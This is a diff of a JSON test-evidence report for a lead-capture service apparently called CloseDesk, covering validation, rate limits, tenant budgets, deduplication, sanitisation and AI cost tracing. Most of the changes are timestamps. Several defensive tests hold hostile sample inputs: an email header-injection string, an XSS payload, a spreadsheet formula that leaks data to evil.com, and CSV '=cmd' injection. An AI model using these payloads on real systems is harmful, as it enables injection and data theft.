@@ -1,7 +1,7 @@
 {
   "ticket": "CD05",
   "title": "Public Endpoint Controls and Budgets Evidence",
-  "timestamp": "2026-11-06T13:01:16.047Z",
+  "timestamp": "2026-11-03T18:39:33.614Z",
   "summary": {
     "total_tests": 30,
     "passed": 30,
@@ -34,7 +34,7 @@
           "code": "INVALID_PAYLOAD"
         }
       },
-      "timestamp": "2026-11-06T13:01:08.459Z"
+      "timestamp": "2026-11-03T18:39:31.568Z"
     },
     {
       "test_id": "AC1.2",
@@ -49,7 +49,7 @@
           "maxBytes": 32768
         }
       },
-      "timestamp": "2026-11-06T13:01:08.460Z"
+      "timestamp": "2026-11-03T18:39:31.568Z"
     },
     {
       "test_id": "AC1.3",
@@ -59,11 +59,11 @@
       "evidence": {
         "statusCode": 405,
         "body": {
-          "error": "Method not allowed. Use POST.",
+          "error": "Method not allowed.",
           "code": "METHOD_NOT_ALLOWED"
         }
       },
-      "timestamp": "2026-11-06T13:01:08.460Z"
+      "timestamp": "2026-11-03T18:39:31.568Z"
     },
     {
       "test_id": "AC2.1",
@@ -75,7 +75,7 @@
         "rejectedCount": 18,
         "totalRequests": 25
       },
-      "timestamp": "2026-11-06T13:01:08.461Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC2.2",
@@ -86,7 +86,7 @@
         "allowed": false,
         "code": "BUDGET_EXCEEDED"
       },
-      "timestamp": "2026-11-06T13:01:08.461Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC2.3",
@@ -97,7 +97,7 @@
         "maxConcurrency": 5,
         "excessAllowed": false
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC3.1",
@@ -108,7 +108,7 @@
         "tenantA": "tenant_alpha_exhausted",
         "allowed": false
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC3.2",
@@ -119,7 +119,7 @@
         "tenantB": "tenant_beta_healthy",
         "allowed": true
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC3.3",
@@ -129,7 +129,7 @@
       "evidence": {
         "tenantBAllowed": true
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC4.1",
@@ -139,7 +139,7 @@
       "evidence": {
         "leadHash": "64860bbcaa391c44af48bad64a07815ac79bc95bfa095e57a716176c3581017e"
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC4.2",
@@ -150,7 +150,7 @@
         "isDuplicate": true,
         "reason": "Exact duplicate lead submission received within deduplication window."
       },
-      "timestamp": "2026-11-06T13:01:08.462Z"
+      "timestamp": "2026-11-03T18:39:31.569Z"
     },
     {
       "test_id": "AC4.3",
@@ -161,7 +161,7 @@
         "isRateLimited": true,
         "reason": "Lead submission rate limit exceeded for this session. Please wait before submitting another lead."
       },
-      "timestamp": "2026-11-06T13:01:08.463Z"
+      "timestamp": "2026-11-03T18:39:31.570Z"
     },
     {
       "test_id": "AC4.4",
@@ -171,7 +171,7 @@
       "evidence": {
         "stripped": true
       },
-      "timestamp": "2026-11-06T13:01:14.582Z"
+      "timestamp": "2026-11-03T18:39:32.784Z"
     },
     {
       "test_id": "AC4.5",
@@ -182,7 +182,7 @@
         "rawHeader": "Welcome to CloseDesk\r\nBcc: spam_victim@evil.com\r\nSubject: Injected",
         "sanitized": "Welcome to CloseDesk Bcc: spam_victim@evil.com Subject: Injected"
       },
-      "timestamp": "2026-11-06T13:01:14.582Z"
+      "timestamp": "2026-11-03T18:39:32.785Z"
     },
     {
       "test_id": "AC5.1",
@@ -193,7 +193,7 @@
         "statusCode": 413,
         "code": "PAYLOAD_TOO_LARGE"
       },
-      "timestamp": "2026-11-06T13:01:14.584Z"
+      "timestamp": "2026-11-03T18:39:32.785Z"
     },
     {
       "test_id": "AC5.2",
@@ -204,7 +204,7 @@
         "statusCode": 413,
         "code": "PAYLOAD_TOO_LARGE"
       },
-      "timestamp": "2026-11-06T13:01:14.611Z"
+      "timestamp": "2026-11-03T18:39:32.793Z"
     },
     {
       "test_id": "AC5.3",
@@ -218,7 +218,7 @@
           "code": "INVALID_PAYLOAD"
         }
       },
-      "timestamp": "2026-11-06T13:01:14.612Z"
+      "timestamp": "2026-11-03T18:39:32.793Z"
     },
     {
       "test_id": "AC5.4",
@@ -229,7 +229,7 @@
         "statusCode": 400,
         "code": "INVALID_IMAGE_PAYLOAD"
       },
-      "timestamp": "2026-11-06T13:01:14.614Z"
+      "timestamp": "2026-11-03T18:39:32.794Z"
     },
     {
       "test_id": "AC6.1",
@@ -246,7 +246,7 @@
           "verified_by_server": false
         }
       },
-      "timestamp": "2026-11-06T13:01:14.614Z"
+      "timestamp": "2026-11-03T18:39:32.794Z"
     },
     {
       "test_id": "AC6.2",
@@ -256,7 +256,7 @@
       "evidence": {
         "statusCode": 200
       },
-      "timestamp": "2026-11-06T13:01:15.425Z"
+      "timestamp": "2026-11-03T18:39:33.205Z"
     },
     {
       "test_id": "AC6.3",
@@ -266,7 +266,7 @@
       "evidence": {
         "statusCode": 200
       },
-      "timestamp": "2026-11-06T13:01:16.040Z"
+      "timestamp": "2026-11-03T18:39:33.612Z"
     },
     {
       "test_id": "AC7.1",
@@ -277,7 +277,7 @@
         "rawXss": "<script>alert(\"XSS\")</script><img src=\"x\" onerror=\"steal()\"/>",
         "safeHtml": "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;steal()&quot;/&gt;"
       },
-      "timestamp": "2026-11-06T13:01:16.040Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC7.2",
@@ -288,7 +288,7 @@
         "dangerousCell": "=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")",
         "safeCell": "\"'=HYPERLINK(\"\"http://evil.com?leak=\"\"&A1,\"\"Click Me\"\")\""
       },
-      "timestamp": "2026-11-06T13:01:16.041Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC7.3",
@@ -305,7 +305,7 @@
           "\rnewline_lead"
         ]
       },
-      "timestamp": "2026-11-06T13:01:16.041Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC7.4",
@@ -322,7 +322,7 @@
         ],
         "formattedRow": "\"lead_101\",\"'=cmd\",\"John Doe\",\"john@test.com\",\"'@Executive\""
       },
-      "timestamp": "2026-11-06T13:01:16.041Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC7.5",
@@ -332,17 +332,17 @@
       "evidence": {
         "hasFormulaDefense": true
       },
-      "timestamp": "2026-11-06T13:01:16.042Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC8.1",
       "name": "Authoritative AI trace record contains provider, model, tenantId, sessionId, operation, usage, cost, and retryCount",
       "status": "PASS",
-      "details": "Trace record: {\"trace_id\":\"trace_1793970076043_eb3fp\",\"timestamp\":\"2026-11-06T13:01:16.043Z\",\"provider\":\"openai\",\"model\":\"gpt-4o-mini\",\"tenantId\":\"tenant_alpha\",\"sessionId\":\"lead_test_ai_01\",\"operation\":\"chat\",\"retryCount\":0,\"usage\":{\"total_tokens\":150,\"prompt_tokens\":100,\"completion_tokens\":50},\"estimatedCostUsd\":0.000045,\"status\":\"completed\",\"duration_ms\":0}",
+      "details": "Trace record: {\"trace_id\":\"trace_1793731173613_1lm6h\",\"timestamp\":\"2026-11-03T18:39:33.613Z\",\"provider\":\"openai\",\"model\":\"gpt-4o-mini\",\"tenantId\":\"tenant_alpha\",\"sessionId\":\"lead_test_ai_01\",\"operation\":\"chat\",\"retryCount\":0,\"usage\":{\"total_tokens\":150,\"prompt_tokens\":100,\"completion_tokens\":50},\"estimatedCostUsd\":0.000045,\"status\":\"completed\",\"duration_ms\":0}",
       "evidence": {
         "trace": {
-          "trace_id": "trace_1793970076043_eb3fp",
-          "timestamp": "2026-11-06T13:01:16.043Z",
+          "trace_id": "trace_1793731173613_1lm6h",
+          "timestamp": "2026-11-03T18:39:33.613Z",
           "provider": "openai",
           "model": "gpt-4o-mini",
           "tenantId": "tenant_alpha",
@@ -359,7 +359,7 @@
           "duration_ms": 0
         }
       },
-      "timestamp": "2026-11-06T13:01:16.044Z"
+      "timestamp": "2026-11-03T18:39:33.613Z"
     },
     {
       "test_id": "AC8.2",
@@ -373,7 +373,7 @@
           "completion_tokens": "unknown"
         }
       },
-      "timestamp": "2026-11-06T13:01:16.044Z"
+      "timestamp": "2026-11-03T18:39:33.614Z"
     },
     {
       "test_id": "AC8.3",
@@ -382,7 +382,7 @@
       "details": "Status: reconciled, variance: 0",
       "evidence": {
         "reconciliation": {
-          "reconciliation_timestamp": "2026-11-06T13:01:16.046Z",
+          "reconciliation_timestamp": "2026-11-03T18:39:33.614Z",
           "total_operations_traced": 3,
           "known_usage_operations": 2,
           "unknown_usage_operations": 1,
@@ -406,7 +406,7 @@
           }
         }
       },
-      "timestamp": "2026-11-06T13:01:16.046Z"
+      "timestamp": "2026-11-03T18:39:33.614Z"
     },
     {
       "test_id": "AC8.4",
@@ -415,7 +415,7 @@
       "details": "Status: variance_detected, variance: $-5.4998",
       "evidence": {
         "result": {
-          "reconciliation_timestamp": "2026-11-06T13:01:16.046Z",
+          "reconciliation_timestamp": "2026-11-03T18:39:33.614Z",
           "total_operations_traced": 1,
           "known_usage_operations": 1,
           "unknown_usage_operations": 0,
@@ -434,7 +434,7 @@
           }
         }
       },
-      "timestamp": "2026-11-06T13:01:16.046Z"
+      "timestamp": "2026-11-03T18:39:33.614Z"
     }
   ]
 }
